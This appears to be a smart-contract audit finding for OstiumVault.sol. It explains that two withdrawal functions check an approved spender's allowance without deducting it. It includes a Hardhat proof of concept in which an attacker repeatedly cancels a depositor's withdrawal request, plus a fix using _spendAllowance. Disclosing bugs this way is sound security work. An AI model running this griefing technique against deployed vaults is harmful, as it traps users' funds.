# Unspent allowance in `cancelWithdrawRequest` and `makeWithdrawRequest` allows approved spenders to permanently grief owner withdrawals

## Summary

The `cancelWithdrawRequest` and `makeWithdrawRequest` functions in `OstiumVault.sol` check if the caller has sufficient allowance to manage another user's shares, but fail to actually deduct the allowance. This allows an approved spender to repeatedly cancel and re-queue a user's withdrawal requests infinitely without consuming their allowance, trapping the user's funds in the vault indefinitely.

## Root Cause

When a user wants to withdraw their `oLP` shares from the vault, they call `makeWithdrawRequest`, which initiates a timelock before they can redeem. Alternatively, an approved spender can call `makeWithdrawRequest` or `cancelWithdrawRequest` on behalf of the owner if they possess sufficient allowance.

```solidity
    function cancelWithdrawRequest(...) external {
        //...
        uint256 allowance = allowance(owner, sender);

@>      if (sender != owner && (allowance == 0 || allowance < shares)) {
@>          revert NotAllowed(sender);
@>      }

        withdrawRequests[owner][unlockEpoch] -= shares;
        //...
    }
```

The exact same omission occurs in `makeWithdrawRequest`. While both functions ensure `allowance >= shares`, neither function actually consumes the allowance via `_spendAllowance(owner, sender, shares)`. This divergence from the ERC20/ERC4626 standard means that a single approved share amount can be reused an infinite number of times.

## Impact

An attacker with any non-zero allowance can perpetually cancel a user's legitimate withdrawal requests, trapping their funds in the vault indefinitely. If the user notices and re-queues their withdrawal, the attacker can just cancel it again. If the attacker wants to be even more malicious, they can call `makeWithdrawRequest` themselves to push the user's timelock further back into the future, resetting the waiting period indefinitely.

## Likelihood

- **Who can trigger this**: Any address that the owner has granted allowance to. In DeFi, it is incredibly common to give infinite approval to router contracts, yield aggregators, or automation bots. If one of these protocols is compromised, or is malicious, they can permanently trap the user's assets.
- **Cost to attacker**: Minimal (only the gas required to call `cancelWithdrawRequest`).
- **Limiting conditions**: This exploit strictly requires the owner to have granted an allowance to the attacker. It cannot be triggered arbitrarily against a user who has not approved the attacker's address.

## Proof of Concept

```typescript
import { expect } from "chai";
import { ethers, upgrades } from "hardhat";

describe("OstiumVault – Allowance Not Spent Griefing PoC", function () {
  let vault: any;
  let asset: any;
  let deployer: any, lp: any, attacker: any;

  beforeEach(async function () {
    [deployer, lp, attacker] = await ethers.getSigners();

    // ---- Deploy mocks ----
    const MockOpenPnl = await ethers.getContractFactory("MockOpenPnl");
    const openPnl = await MockOpenPnl.deploy();
    await openPnl.waitForDeployment();

    const MockRegistry = await ethers.getContractFactory("MockRegistry");
    const registry = await MockRegistry.deploy(
      await openPnl.getAddress(),
      deployer.address, // gov
    );
    await registry.waitForDeployment();

    const MockAsset = await ethers.getContractFactory("MockAsset");
    asset = await MockAsset.deploy();
    await asset.waitForDeployment();
    await asset.initialize();

    // ---- Deploy & initialize vault ----
    const OstiumVault = await ethers.getContractFactory("OstiumVault");
    vault = await upgrades.deployProxy(
      OstiumVault,
      [
        await asset.getAddress(), // _asset
        await registry.getAddress(), // _registry
        ethers.parseUnits("1", 18), // _maxAccOpenPnlDeltaPerToken
        ethers.parseUnits("0.001", 18), // _maxDailyAccPnlDeltaPerToken (>= MIN_DAILY_ACC_PNL_DELTA = 1e13)
        1000, // _maxSupplyIncreaseDailyP  (<= 30000)
        5000, // _maxDiscountP  (<= 5000)
        20000, // _maxDiscountThresholdP  (> 100 * PRECISION_2 = 10000)
        [5000, 10000], // _withdrawLockThresholdsP  ([1] > [0])
      ],
      { unsafeAllow: ["constructor"] },
    );
    await vault.waitForDeployment();

    // ---- LP deposits 100 USDC into the vault ----
    const depositAmount = ethers.parseUnits("100", 6);
    await asset.mint(lp.address, depositAmount);
    await asset
      .connect(lp)
      .approve(await vault.getAddress(), ethers.MaxUint256);
    await vault.connect(lp).deposit(depositAmount, lp.address);

    // Verify LP has oLP shares
    const lpBalance = await vault.balanceOf(lp.address);
    expect(lpBalance).to.be.gt(0n);
  });

  it("Attacker cancels LP's legitimate withdrawal request using unspent allowance", async function () {
    const lpBalance = await vault.balanceOf(lp.address);

    // ================================================================
    // STEP 1: LP legitimately requests to withdraw ALL their shares
    // ================================================================
    await vault.connect(lp).makeWithdrawRequest(lpBalance, lp.address);

    const currentEpoch = await vault.currentEpoch();
    const timelock = await vault.withdrawEpochsTimelock();
    const unlockEpoch = currentEpoch + BigInt(timelock);

    // Verify the request was recorded
    const pendingBefore = await vault.withdrawRequests(lp.address, unlockEpoch);
    expect(pendingBefore).to.equal(lpBalance);

    // ================================================================
    // STEP 2: LP approve some shares to attacker (lpBalance / 2)
    // ================================================================
    await vault.connect(lp).approve(attacker.address, lpBalance / 2n);

    // ================================================================
    // STEP 3: Fast forward time to just before the unlock epoch
    // ================================================================
    const secondsPerEpoch = 86400n;
    const currentTime = (await ethers.provider.getBlock("latest"))!.timestamp;
    const targetTime =
      BigInt(currentTime) +
      (unlockEpoch - currentEpoch) * secondsPerEpoch -
      10n;
    await ethers.provider.send("evm_setNextBlockTimestamp", [
      Number(targetTime),
    ]);
    await ethers.provider.send("evm_mine", []);

    // ================================================================
    // STEP 4: attacker repeats cancelWithdrawRequest twice using the same allowance
    // ================================================================
    const aAllowance = await vault.allowance(lp.address, attacker.address);

    await vault
      .connect(attacker)
      .cancelWithdrawRequest(aAllowance, lp.address, unlockEpoch);

    await vault
      .connect(attacker)
      .cancelWithdrawRequest(aAllowance, lp.address, unlockEpoch);

    // ================================================================
    // PROOF 1: The LP's legitimate exit has been wiped out
    // ================================================================
    const pendingAfter = await vault.withdrawRequests(lp.address, unlockEpoch);
    expect(pendingAfter).to.equal(0n);
    console.log("LP's withdrawal request was wiped to 0");

    // ================================================================
    // PROOF 2: The attacker's allowance was NEVER spent
    // ================================================================
    const allowanceAfter = await vault.allowance(lp.address, attacker.address);
    expect(allowanceAfter).to.equal(lpBalance / 2n);
    console.log("Attacker's allowance is never spent");
  });
});
```

**Expected Output:**

```
LP's withdrawal request was wiped to 0
Attacker's allowance is never spent
    ✔ Attacker cancels LP's legitimate withdrawal request using unspent allowance


  1 passing (669ms)
```

## Recommended Mitigation

Ensure that the allowance is properly consumed using OpenZeppelin's `_spendAllowance` function when `sender != owner` in both `makeWithdrawRequest` and `cancelWithdrawRequest`.

```diff
    function cancelWithdrawRequest(...) external {
        //...
-       uint256 allowance = allowance(owner, sender);
-
-       if (sender != owner && (allowance == 0 || allowance < shares)) {
-           revert NotAllowed(sender);
-       }
+       if (sender != owner) {
+           _spendAllowance(owner, sender, shares);
+       }

        withdrawRequests[owner][unlockEpoch] -= shares;
        //...
    }
```
